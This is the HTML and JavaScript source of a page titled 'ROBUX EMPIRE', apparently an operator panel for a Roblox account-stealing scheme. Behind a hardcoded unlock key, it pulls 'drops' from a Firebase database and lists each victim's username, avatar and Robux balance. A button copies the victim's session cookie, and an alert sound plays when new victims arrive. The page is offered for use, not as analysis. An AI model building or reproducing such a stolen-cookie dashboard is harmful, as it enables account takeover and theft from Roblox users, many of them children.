<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>ROBUX EMPIRE</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800&display=swap');
    body{margin:0;background:linear-gradient(135deg,#ff00aa,#00ffff,#ffff00);font-family:'Poppins',sans-serif;color:#000;overflow-x:hidden;position:relative;}
    
    /* REAL FLYING DRAGON SVG (EPIC, SMOOTH, DETAILED) */
    .dragon-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      pointer-events: none;
      overflow: hidden;
    }
    .dragon {
      position: absolute;
      width: 250px;
      height: auto;
      animation: fly 20s linear infinite;
      filter: drop-shadow(0 0 20px rgba(0,255,255,0.8));
    }
    @keyframes fly {
      0% { transform: translateX(-300px) translateY(20vh) rotate(-5deg); }
      25% { transform: translateX(30vw) translateY(10vh) rotate(2deg); }
      50% { transform: translateX(60vw) translateY(35vh) rotate(-3deg); }
      75% { transform: translateX(90vw) translateY(15vh) rotate(4deg); }
      100% { transform: translateX(120vw) translateY(25vh) rotate(-5deg); }
    }
    .dragon svg {
      width: 100%;
      height: auto;
    }

    .login{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:999;}
    .login h1{font-size:60px;color:#0ff;text-shadow:0 0 30px #0ff,0 0 60px #f0f;}
    .inputbox{position:relative;width:400px;margin:15px;}
    .inputbox input{padding:20px;font-size:24px;width:100%;border:none;border-radius:50px;background:#fff;color:#000;font-weight:bold;text-align:center;}
    .eye{position:absolute;right:20px;top:20px;cursor:pointer;font-size:28px;color:#0ff;}
    .login button{padding:20px;width:400px;font-size:24px;border:none;border-radius:50px;background:#0ff;color:#000;font-weight:800;cursor:pointer;box-shadow:0 0 40px #0ff;}
    .login button:hover{transform:scale(1.1);box-shadow:0 0 80px #f0f;}
    .main{display:none;padding:40px;min-height:100vh;}
    .header{text-align:center;margin-bottom:40px;}
    .header h1{font-size:70px;color:#fff;text-shadow:0 0 40px #000,0 0 80px #0ff;}
    .total{background:linear-gradient(45deg,#0ff,#f0f);padding:30px;border-radius:30px;box-shadow:0 0 60px rgba(0,255,255,0.8);margin:30px auto;max-width:800px;}
    .total h2{font-size:50px;color:#000;text-shadow:0 0 20px #fff;}
    .total span{font-size:80px;color:#000;font-weight:900;}
    .logs{max-width:1200px;margin:0 auto;}
    .log{background:rgba(255,255,255,0.95);border-radius:25px;padding:25px;margin:25px 0;box-shadow:0 0 40px rgba(0,255,255,0.6);display:flex;align-items:center;transition:0.3s;}
    .log:hover{transform:translateY(-10px);box-shadow:0 0 80px #0ff;}
    .avatar{width:120px;height:120px;border-radius:50%;border:6px solid #0ff;box-shadow:0 0 30px #0ff;margin-right:30px;}
    .info{flex:1;}
    .info h3{font-size:32px;color:#000;margin:0;}
    .info p{font-size:18px;color:#333;margin:6px 0;}
    .robux{color:#0f0;font-weight:900;font-size:28px;}
    .copy{background:#0ff;color:#000;padding:15px 30px;border-radius:50px;font-weight:bold;cursor:pointer;box-shadow:0 0 30px #0ff;}
    .copy:hover{background:#f0f;}
    .loading{text-align:center;color:#0ff;font-size:24px;margin:40px;animation:pulse 1.5s infinite;}
    @keyframes pulse{0%{opacity:0.6}50%{opacity:1}100%{opacity:0.6}}
    .error{color:#f00;font-weight:bold;text-align:center;margin:40px;}

    /* DARK MODE */
    .dark body {background:linear-gradient(135deg,#000,#111,#000)!important;color:#0f0!important;}
    .dark .login {background:rgba(0,0,0,0.95)!important;}
    .dark .login h1 {color:#0ff!important;text-shadow:0 0 30px #0ff,0 0 60px #00f!important;}
    .dark .inputbox input {background:#111!important;color:#0f0!important;border:2px solid #0ff!important;}
    .dark .login button {background:#0ff!important;color:#000!important;}
    .dark .header h1 {color:#0f0!important;text-shadow:0 0 40px #000,0 0 80px #0ff!important;}
    .dark .total {background:linear-gradient(45deg,#0f0,#0ff)!important;}
    .dark .total span, .dark .total h2 {color:#000!important;}
    .dark .log {background:rgba(0,255,0,0.1)!important;border:1px solid #0ff!important;}
    .dark .copy {background:#0ff!important;color:#000!important;}
    .dark .copy:hover {background:#0f0!important;}
    .dark .dragon path {fill: #0f0 !important; filter: drop-shadow(0 0 15px #0ff);}
  </style>
</head>
<body>

  <!-- EPIC FLYING DRAGON (SVG) -->
  <div class="dragon-container">
    <div class="dragon">
      <svg viewBox="0 0 400 300" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id="wingGrad" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" stop-color="#FF4500"/>
            <stop offset="100%" stop-color="#FF8C00"/>
          </linearGradient>
        </defs>
        <!-- Body -->
        <path d="M100,150 Q80,140 70,130 Q60,120 55,110 Q50,100 50,90 Q50,70 60,60 Q70,50 85,55 Q100,60 110,75 Q120,90 115,110 Q110,130 100,150" fill="#8B4513" stroke="#654321" stroke-width="3"/>
        <!-- Head -->
        <ellipse cx="45" cy="85" rx="25" ry="20" fill="#654321"/>
        <circle cx="35" cy="80" r="5" fill="#000"/>
        <path d="M30,75 Q20,70 15,75" fill="none" stroke="#FF4500" stroke-width="3"/>
        <!-- Wings -->
        <path d="M110,100 Q150,50 200,70 Q220,80 210,100 Q200,120 150,110 Q120,105 110,100" fill="url(#wingGrad)" opacity="0.9"/>
        <path d="M110,100 Q70,60 30,80 Q20,90 30,110 Q70,125 110,100" fill="url(#wingGrad)" opacity="0.9" transform="scale(-1,1) translate(-220,0)"/>
        <!-- Tail -->
        <path d="M100,150 Q90,170 85,190 Q80,210 90,225 Q100,240 120,235 Q140,230 150,220" fill="#8B4513" stroke="#654321" stroke-width="3"/>
        <!-- Spikes -->
        <path d="M80,60 L75,50 L70,60 M95,65 L90,55 L85,65 M110,75 L105,65 L100,75" fill="none" stroke="#FF4500" stroke-width="2"/>
      </svg>
    </div>
  </div>

  <!-- DARK MODE BUTTON -->
  <button id="darkModeBtn" onclick="toggleDarkMode()" style="position:fixed;top:20px;right:20px;padding:12px 24px;background:#0ff;color:#000;border:none;border-radius:50px;font-weight:800;cursor:pointer;box-shadow:0 0 30px #0ff;z-index:1000;font-family:Poppins;">
    DARK MODE
  </button>

  <div class="login" id="login">
    <h1>ROBUX EMPIRE</h1>
    <div class="inputbox">
      <input type="password" id="key" placeholder="ENTER KEY">
      <span class="eye" onclick="toggleKey()">Eye</span>
    </div>
    <button onclick="unlock()">UNLOCK EMPIRE</button>
  </div>

  <div class="main" id="main">
    <div class="header">
      <h1>TOTAL ROBUX: <span id="total">0</span></h1>
    </div>
    <div class="total">
      <h2>EMPIRE VALUE</h2>
      <span id="total2">0</span> Robux
    </div>
    <div class="logs" id="logs">
      <div class="loading">EMPIRE SYNCING... (15 sec max)</div>
    </div>
    <div class="error" id="error" style="display:none;"></div>
  </div>

  <script>
    const KEY = "01axrch";
    const firebaseConfig = {
      apiKey: "AIzaSyBUMdPMNAJpUzmyRfWjJ1RC7DsyoxcR0bk",
      authDomain: "flamesaxrch-empire.firebaseapp.com",
      databaseURL: "https://flamesaxrch-empire-default-rtdb.europe-west1.firebasedatabase.app",
      projectId: "flamesaxrch-empire",
      storageBucket: "flamesaxrch-empire.firebasestorage.app",
      messagingSenderId: "1067890777932",
      appId: "1:1067890777932:web:a50536cc21933b1e2139e9"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let lastCount = 0;

    function toggleKey() {
      const i = document.getElementById('key');
      const e = document.querySelector('.eye');
      i.type = i.type === 'password' ? 'text' : 'password';
      e.textContent = i.type === 'password' ? 'Eye' : 'Hide';
    }

    function unlock() {
      if (document.getElementById('key').value === KEY) {
        document.getElementById('login').style.display = 'none';
        document.getElementById('main').style.display = 'block';
        load();
        setInterval(load, 5000);
      } else {
        alert("WRONG KEY");
      }
    }

    function load() {
      db.ref('drops').once('value').then(s => {
        const data = s.val() || {};
        const arr = Object.values(data);
        let total = 0;
        const html = arr.map(c => {
          total += Number(c.robux);
          return `<div class="log">
            <img src="${c.headshot}" class="avatar" onerror="this.src='https://i.imgur.com/removed.png'">
            <div class="info">
              <h3>${c.user} (@${c.display})</h3>
              <p class="robux">${Number(c.robux).toLocaleString()} Robux</p>
              <button class="copy" onclick="navigator.clipboard.writeText('${c.cookie}')">COPY</button>
            </div>
          </div>`;
        });
        document.getElementById('total').textContent = total.toLocaleString();
        document.getElementById('total2').textContent = total.toLocaleString();
        document.getElementById('logs').innerHTML = html.join('') || "<h1 style='color:#fff;'>WAITING FOR DROP</h1>";
        if (arr.length > lastCount) {
          const audio = new Audio('https://cdn.discordapp.com/attachments/1298475629385744394/1298475688884625420/alert.mp3');
          audio.play().catch(() => {});
        }
        lastCount = arr.length;
      }).catch(err => {
        document.getElementById('error').textContent = 'DB ERROR: ' + err.message;
        document.getElementById('error').style.display = 'block';
      });
    }

    function toggleDarkMode() {
      document.body.classList.toggle('dark');
      const btn = document.getElementById('darkModeBtn');
      const isDark = document.body.classList.contains('dark');
      btn.textContent = isDark ? 'LIGHT MODE' : 'DARK MODE';
      btn.style.background = isDark ? '#000' : '#0ff';
      btn.style.color = isDark ? '#0ff' : '#000';
      localStorage.setItem('darkMode', isDark);
    }

    window.addEventListener('load', () => {
      if (localStorage.getItem('darkMode') === 'true') {
        document.body.classList.add('dark');
        const btn = document.getElementById('darkModeBtn');
        btn.textContent = 'LIGHT MODE';
        btn.style.background = '#000';
        btn.style.color = '#0ff';
      }
    });
  </script>
</body>
</html>
